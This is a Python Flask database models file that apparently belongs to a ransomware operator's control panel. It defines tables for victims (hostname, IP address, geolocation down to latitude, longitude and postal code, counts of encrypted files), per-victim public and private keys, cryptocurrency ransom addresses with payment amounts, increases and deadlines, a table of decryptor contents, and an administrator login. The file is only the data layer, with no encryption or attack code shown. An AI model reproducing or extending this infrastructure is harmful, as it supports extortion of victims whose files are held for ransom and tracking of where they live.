from app import db
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin
import pytz


tz = pytz.timezone('America/Toronto')


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(120))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    email = db.Column(db.String(120))
    ip_address = db.Column(db.String(120))
    # keys
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    # payment details
    crypto_address = db.Column(db.String(120), unique=True)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)

    payment_status = db.Column(db.Boolean, default=False)
    pic_id = db.Column(db.Boolean, default=False)
    status = db.Column(db.Boolean, default=False)

    amount_paid = db.Column(db.Float, default=0.0)
    address_index = db.Column(db.Integer, unique=True)
    payment_increase = db.Column(db.Integer, default=0)
    # creation date
    creation_date = db.Column(db.DateTime, default=datetime.utcnow)
    expiration = db.Column(db.DateTime)


class UsersPaid(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(120))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    email = db.Column(db.String(120))
    ip_address = db.Column(db.String(120))
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    crypto_address = db.Column(db.String(120), unique=True)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False)
    amount_paid = db.Column(db.Float, default=0.0)
    address_index = db.Column(db.Integer, unique=True)
    creation_date = db.Column(db.DateTime, default=datetime.utcnow)
    payment_date = db.Column(db.DateTime)


class UsersData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(120), unique=True)
    files = db.Column(db.Integer)
    ip = db.Column(db.String(120))
    city = db.Column(db.String(120))
    region = db.Column(db.String(120))
    country = db.Column(db.String(120))
    postal = db.Column(db.String(120))
    latitude = db.Column(db.String(120))
    longitude = db.Column(db.String(120))


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True


class Decrypter(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.Text)
    filename = db.Column(db.String(32))
    creation = db.Column(db.DateTime, default=datetime.now(tz=tz))


